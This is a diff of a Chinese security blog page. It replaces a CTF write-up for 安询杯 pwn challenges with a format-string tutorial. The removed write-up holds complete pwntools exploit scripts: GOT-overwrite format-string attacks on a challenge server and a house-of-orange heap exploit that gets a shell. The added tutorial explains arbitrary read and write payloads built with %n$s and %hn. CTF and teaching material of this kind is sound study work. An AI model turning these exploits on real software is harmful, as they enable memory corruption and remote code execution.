@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>安询杯pwn_wp | Whali3n51&#39;s blog</title>
-  <meta name="keywords" content=" 盲打pwn ">
-  <meta name="description" content="安询杯pwn_wp | Whali3n51&#39;s blog">
+  <title>格式化字符串专题总结 | Whali3n51&#39;s blog</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="格式化字符串专题总结 | Whali3n51&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="关于本人：现在是一个普通二本的一个大三的学生。干啥啥不行，吃饭第一名。">
 <meta property="og:type" content="website">
@@ -397,31 +397,19 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-安询杯wp_pwn" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-格式化字符串专题总结" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">安询杯pwn_wp</h1>
+        <h1 class="article-title">格式化字符串专题总结</h1>
     
     <div class="article-meta">
         
         
         
-        <span class="book">
-            
-                <a href="javascript:" target="_blank" data-rel="Writeup noopener">Writeup</a>
-            
-        </span>
-        
-        
-        <span class="tag">
-            
-            <a href="javascript:" target="_blank" rel="noopener" class="color1">盲打pwn</a>
-            
-        </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-12-01 13:47:02'>2019-12-01 13:40</time>
+        创建时间:<time class="date" title='更新时间: 2019-12-10 13:34:22'>2019-12-10 13:34</time>
         
     </div>
     <div class="article-meta">
@@ -454,7 +442,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#summary"><span class="toc-text">summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-fmt32"><span class="toc-text">0x01 fmt32</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#introduction"><span class="toc-text">introduction</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit"><span class="toc-text">exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-fmt64"><span class="toc-text">0x02 fmt64</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#introduction-1"><span class="toc-text">introduction</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit-1"><span class="toc-text">exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-heap"><span class="toc-text">0x03 heap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#introduction-2"><span class="toc-text">introduction</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit-2"><span class="toc-text">exploit</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞原理分析"><span class="toc-text">漏洞原理分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#32位格式化字符串利用"><span class="toc-text">32位格式化字符串利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#64为格式化字符串利用"><span class="toc-text">64为格式化字符串利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ebp-chain修改任意地址"><span class="toc-text">Ebp chain修改任意地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -470,28 +458,40 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>简单说一下这个比赛，感觉这个比赛难度还是不错的，刚刚好，侥幸拿到了一个一血。其中有三道盲打pwn，两道格式化字符串的，一道rop的盲打。rop那道是真的没什么思路，还有一道路由器的pwn,我不知道为什么运行不了二进制文件，可能我环境配置的问题吧。</p>
-<h2 id="0x01-fmt32"><a href="#0x01-fmt32" class="headerlink" title="0x01 fmt32"></a>0x01 fmt32</h2><h3 id="introduction"><a href="#introduction" class="headerlink" title="introduction"></a>introduction</h3><p>这一道题通过题目描述，只给了容器，然后看题目名为32位格式化字符串，并没有像往常的pwn题那样给二进制文件。所以这个时候大致猜测为盲打pwn。</p>
-<h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p>这道题侥幸拿到了一个一血，顺便总结一下我自己认为的格式化字符串盲打的想法吧。首先就是利用’%p’通过格式化字符串将栈上数据全部打印出来。打印出来，会得到两个信息，一个是我们输入的值是在栈上，另一个是发现有一个text段的地址，这个时候就能得到程序的基址，而且程序没有开启pie。按照一般的思路，这个时候可以用%s将整个程序dump出来。但是我没有这么做，我嫌效率太低。我直接猜测的got表的地址。我为什么这么做呢。因位got表的偏移和text的偏移是固定的，想知道这个偏移，随便打开一个32位程序就知道了，接下来就是不断尝试printf在got表的地址了。然后后面就是格式化字符串的利用了。</p>
-<p>下面是我的脚本。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">'47.108.135.45'</span>,<span class="number">10001</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">addr=<span class="number">0x804A014</span></span><br><span class="line">payload=<span class="string">'a'</span>+p32(addr)+<span class="string">'%'</span>+<span class="string">'8'</span>+<span class="string">'$s'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Please tell me:"</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">'Repeater:a'</span>)</span><br><span class="line">p.recv(<span class="number">4</span>)</span><br><span class="line">printf_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">"printf"</span>,printf_addr)</span><br><span class="line">system=printf_addr-libc.dump(<span class="string">"printf"</span>)+libc.dump(<span class="string">"system"</span>)</span><br><span class="line">payload=<span class="string">'a'</span>+p32(addr)+p32(addr+<span class="number">2</span>)+<span class="string">'%'</span>+str((system&amp;<span class="number">0xffff</span>)<span class="number">-0x12</span>)+<span class="string">'c%8$hn'</span>+<span class="string">'%'</span>+str((system&gt;&gt;<span class="number">16</span>)-((system&amp;<span class="number">0xffff</span>)<span class="number">-0x12</span>)<span class="number">-18</span>)+<span class="string">'c%9$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Please tell me:"</span>,payload)</span><br><span class="line"><span class="keyword">print</span> hex(system)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">";cat /flag"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="0x02-fmt64"><a href="#0x02-fmt64" class="headerlink" title="0x02 fmt64"></a>0x02 fmt64</h2><h3 id="introduction-1"><a href="#introduction-1" class="headerlink" title="introduction"></a>introduction</h3><p>这一道题和上一道题一样，不过这一道题给了一个txt,里面描述如下</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> readelf -s stilltest</span></span><br><span class="line">Symbol table '.dynsym' contains 15 entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 (2)</span><br><span class="line">     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strlen@GLIBC_2.2.5 (2)</span><br><span class="line">     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND setbuf@GLIBC_2.2.5 (2)</span><br><span class="line">     4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND printf@GLIBC_2.2.5 (2)</span><br><span class="line">     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND memset@GLIBC_2.2.5 (2)</span><br><span class="line">     6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND alarm@GLIBC_2.2.5 (2)</span><br><span class="line">     7: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.2.5 (2)</span><br><span class="line">     8: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.2.5 (2)</span><br><span class="line">     9: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND gmon_start</span><br><span class="line">    10: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND sprintf@GLIBC_2.2.5 (2)</span><br><span class="line">    11: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND exit@GLIBC_2.2.5 (2)</span><br><span class="line">    12: 0000000000601080     8 OBJECT  GLOBAL DEFAULT   26 stdout@GLIBC_2.2.5 (2)</span><br><span class="line">    13: 0000000000601090     8 OBJECT  GLOBAL DEFAULT   26 stdin@GLIBC_2.2.5 (2)</span><br><span class="line">    14: 00000000006010a0     8 OBJECT  GLOBAL DEFAULT   26 stderr@GLIBC_2.2.5 (2)</span><br></pre></td></tr></table></figure>
-
-<h3 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h3><p>根据这个txt,完全可以算出printf_got表地址。存放stdout的地址为601080，这个地址同时也是bss段的开头地址，bss地址和got表地址相差0x20，这个也是随便打开一个64位程序能得到的偏移。然后也是泄露地址，确定偏移量，然后格式化字符串构造。不过可惜没拿到一血，当时因为有其他事情，晚做了三四个小时。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">'47.108.135.45'</span>,<span class="number">20162</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">addr=<span class="number">0x601080</span><span class="number">-0x20</span><span class="number">-0x8</span></span><br><span class="line">payload=<span class="string">'%9$s'</span>.ljust(<span class="number">8</span>,<span class="string">'a'</span>)+p64(addr)</span><br><span class="line">p.sendlineafter(<span class="string">"Please tell me:"</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">'Repeater:'</span>)</span><br><span class="line">printf_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">"sprintf"</span>,printf_addr)</span><br><span class="line">system=printf_addr-libc.dump(<span class="string">"sprintf"</span>)+libc.dump(<span class="string">"system"</span>)</span><br><span class="line"><span class="comment">#system=0x666666666666</span></span><br><span class="line">printf=<span class="number">0x601080</span><span class="number">-0x20</span><span class="number">-0x38</span><span class="number">-8</span></span><br><span class="line">payload=<span class="string">'%'</span>+str((system&amp;<span class="number">0xffff</span>)<span class="number">-0x9</span>)+<span class="string">'c%12$hn'</span>+<span class="string">'%'</span>+str(((system&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)-((system&amp;<span class="number">0xffff</span>)<span class="number">-0x9</span>)<span class="number">-0x9</span>)+<span class="string">'c%13$hn'</span></span><br><span class="line">payload+=(<span class="number">32</span>-len(payload))*<span class="string">'a'</span>+p64(printf)+p64(printf+<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Please tell me:"</span>,payload)</span><br><span class="line"><span class="keyword">print</span> hex(system)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">';cat /flag'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="0x03-heap"><a href="#0x03-heap" class="headerlink" title="0x03 heap"></a>0x03 heap</h2><h3 id="introduction-2"><a href="#introduction-2" class="headerlink" title="introduction"></a>introduction</h3><p>介绍很简单，就是一个堆，给了二进制文件,给了libc2.23。</p>
-<h3 id="exploit-2"><a href="#exploit-2" class="headerlink" title="exploit"></a>exploit</h3><p>分析它的伪代码，发现有一个off-by-null，并且最开始有一个格式化字符串漏洞。但是限制开辟堆块大小，必须为0x80以上的堆块。然后这一题有两种解法，一种是house of orange,还有一种就是unlink。unlink比较简单。说一下unlink的思路吧，最初泄露出pie，然后就是常规unlink。下面是我用house of orange做的。最初泄露__libc_start_main，然后确定libc基址。然后利用house of orange,造成堆块重叠，最后构造fake_file，然后getshell。</p>
-<p>下面是我的exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">p=process(<span class="string">"./pwn1"</span>)</span><br><span class="line"><span class="comment">#p=remote('47.108.135.45',20162)</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt;&gt; "</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,index,content)</span>:</span></span><br><span class="line">	menu(<span class="number">1</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'Enter the index you want to create (0-10):'</span>,str(index))</span><br><span class="line">	p.sendlineafter(<span class="string">"Enter a size:\n"</span>,str(size))</span><br><span class="line">	p.sendlineafter(<span class="string">'Enter the content: \n'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">	menu(<span class="number">2</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Enter an index:\n"</span>,str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">	menu(<span class="number">4</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Enter an index:\n"</span>,str(index))</span><br><span class="line">	p.sendlineafter(<span class="string">'Enter the content: \n'</span>,content)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Enter your name: '</span>)</span><br><span class="line">p.sendline(<span class="string">'%15$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Hello, 0x'</span>)</span><br><span class="line">libc_start_main=int(p.recv(<span class="number">12</span>),<span class="number">16</span>)<span class="number">-240</span></span><br><span class="line">libc_base=libc_start_main-libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">success(<span class="string">"libc_base=====&gt;0x%x"</span>%libc_base)</span><br><span class="line">_IO_list_all=libc_base+libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">fake_file=p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)+p64(_IO_list_all<span class="number">-0x10</span>)</span><br><span class="line">fake_file+=p64(<span class="number">1</span>)+p64(<span class="number">2</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)+p64(libc_base+<span class="number">0x18cd57</span>)</span><br><span class="line">fake_file=fake_file.ljust(<span class="number">0xd8</span>,<span class="string">"\x00"</span>)</span><br><span class="line">fake_file+=p64(libc_base+<span class="number">0x3c37a0</span><span class="number">-8</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)</span><br><span class="line">fake_file+=p64(libc_base+libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">create(<span class="number">0xf8</span>,<span class="number">0</span>,<span class="string">'a'</span>)</span><br><span class="line">create(<span class="number">0x108</span>,<span class="number">1</span>,<span class="string">'c'</span>)</span><br><span class="line">create(<span class="number">0xf8</span>,<span class="number">2</span>,<span class="string">'b'</span>)</span><br><span class="line">create(<span class="number">0x88</span>,<span class="number">3</span>,<span class="string">'c'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x100</span>+p64(<span class="number">0x210</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0x108</span>,<span class="number">0</span>,<span class="string">'a'</span>)</span><br><span class="line">edit(<span class="number">1</span>,fake_file)</span><br><span class="line">create(<span class="number">0x1e0</span>,<span class="number">4</span>,<span class="string">'cat /flag'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
+        <p>最近比赛有太多的格式化字符串漏洞，今天就来总结一下常见的格式化字符串。由易到难的讲解格式化字符串的利用和最近遇到格式化字符串的考点。</p>
+<h2 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h2><p>格式化字符串一般都是程序员为了偷懒而导致的漏洞。为了输出字符串，而直接使用printf(&amp;buf)来打印字符串。今天我们从原理上来讲解这样写为什么会产生漏洞。</p>
+<p>正常的使用printf(“%s”,&amp;buf);来打印字符串</p>
+<p>当call printf的时候栈上的结构为：</p>
+<p><img src="./img/fmt/1.png" alt=""></p>
+<p>这样函数就打印出第二个参数的地址上的字符串,这样就能正常打印出‘aaaa’。printf函数识别出‘%s’是一个格式化字符串，然后根据这个格式化字符串去取参数，’%s‘默认取第二个参数为作为字符串输出地址也就是‘%s’的下面一个栈空间，这样就能打印出‘aaaa’。</p>
+<p>如果我们程序员偷懒，不使用格式化字符串，那么我们还是能打印出来。</p>
+<p><img src="./img/fmt/2.png" alt=""></p>
+<p>因为printf没有解析到格式化字符串，直接将‘aaaa’作为格式化字符串输出了。这原理就像是我们平时用printf(“hello world !!”);这个道理是一样的。但是这个时候和printf(“hello world !!”);不一样的是，字符串是我们能控制的，这个时候漏洞就出现了。</p>
+<h2 id="32位格式化字符串利用"><a href="#32位格式化字符串利用" class="headerlink" title="32位格式化字符串利用"></a>32位格式化字符串利用</h2><p>如果我任意构造一个格式化字符串，printf就会去解析，然后就根据解析的内容，去栈上都读偏移，然后执行相应的功能。</p>
+<p>例如，我们输入一个‘%s’的格式化字符串，我们来分析他的原理。</p>
+<p><img src="./img/fmt/3.png" alt=""></p>
+<p>同理，printf解析出‘%s’了，相应的他要读出printf的第二个参数上的值。可是我们又没有给第二个参数，但是在程序里面，确认参数是不看你有没有输入，而是看栈的偏移。对于printf来说，第一个参数是栈顶，第二个参数是当前的[esp+4],第三个参数是[esp+8],依次类推。这里也就是输出‘&amp;buf’栈空间下面那个地址上的值。但是这个地方不确定是不是地址，所以程序可能打印失败。</p>
+<p>但是格式化字符串给了一个我们可以自动定位的一个格式化字符串‘%n$’的参数。也就是在这里可以自己定位栈空间。</p>
+<p>如果我们在这个给的是这‘%4$s’+p32(&amp;’hello world’)</p>
+<p><img src="./img/fmt/4.png" alt=""></p>
+<p>所以这个时候打印出来的就是’hello world’了。这个printf解析出有格式化串‘%4$s‘，也就是将buf栈下第4个栈空间的地址上的值当作字符串打印出来。注意这个p32(&amp;”hello world”)在这里只是做举例用，这个值我们可以写做任意一个值，也就是说我们能泄露任意地址上的值。这就达到了任意地址泄露。</p>
+<p>当然达到任意地址泄露往往只是成功了一半，我们还需要达到任意地址写。</p>
+<p>这个时候printf又提供了一个参数’%n‘,这个参数是将前面打印出来的字符数量写入到第二个参数的所指向的地址上的值。这个时候配合’%c‘可以写任意的值。当然这个’%n‘也可以结合’n$‘来使用，可以定位在栈上偏移。</p>
+<p>例如，我们想在0x80000000(只是举例，不保证地址的合法性)上面写一个0x66666666</p>
+<p>我们应该这样构造出这样的栈</p>
+<p><img src="./img/fmt/5.png" alt=""></p>
+<p>payload应该是这样%1717986918c%7$n+p32(0x80000000),这样就可以在0x80000000上面写0x66666666。</p>
+<p>但是一般这样写有个问题，靠%1717986918c打印出0x66666666需要很长时间，一般程序会死掉，所以不能直接这么写。但是printf还提供了一个%n同类的格式化字符串</p>
+<p>%n        一次性写入四个字节</p>
+<p>%hn    一次性写入两个字节</p>
+<p>%hhn        一次性写入一个字节</p>
+<p>然后我们可以这样构造</p>
+<p>%26214c%8$hn%9$hnaaa+p32(0x80000000)+p32(0x80000002)</p>
+<p>注意，构造的时候，在格式化的串直接不有’\x00‘字符串截断，不然printf不能解析格式化字符串了。</p>
+<p><img src="./img/fmt/6.png" alt=""></p>
+<p>这样就可以任意地址写了。</p>
+<p>一般来说，格式化字符串就是通过任意地址读写，来泄露got和修改got表来达到劫持程序流程。</p>
+<h2 id="64为格式化字符串利用"><a href="#64为格式化字符串利用" class="headerlink" title="64为格式化字符串利用"></a>64为格式化字符串利用</h2><h2 id="Ebp-chain修改任意地址"><a href="#Ebp-chain修改任意地址" class="headerlink" title="Ebp chain修改任意地址"></a>Ebp chain修改任意地址</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至Whali3n51@gmail.com </span>
     </div>
@@ -500,12 +500,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>安询杯pwn_wp</p>
+    <p><span class="copy-title">文章标题:</span>格式化字符串专题总结</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" target="_blank" rel="noopener" title="Whali3n51">Whali3n51</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-12-01, 13:40:00</p>
-    <p><span class="copy-title">最后更新:</span>2019-12-01, 13:47:02</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/12/01/%E5%AE%89%E8%AF%A2%E6%9D%AFwp_pwn/" title="安询杯pwn_wp">http://whali3n51.github.io/2019/12/01/%E5%AE%89%E8%AF%A2%E6%9D%AFwp_pwn/</a>
+    <p><span class="copy-title">发布时间:</span>2019-12-10, 13:34:22</p>
+    <p><span class="copy-title">最后更新:</span>2019-12-10, 13:34:22</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/12/10/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E6%80%BB%E7%BB%93/" title="格式化字符串专题总结">http://whali3n51.github.io/2019/12/10/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E6%80%BB%E7%BB%93/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
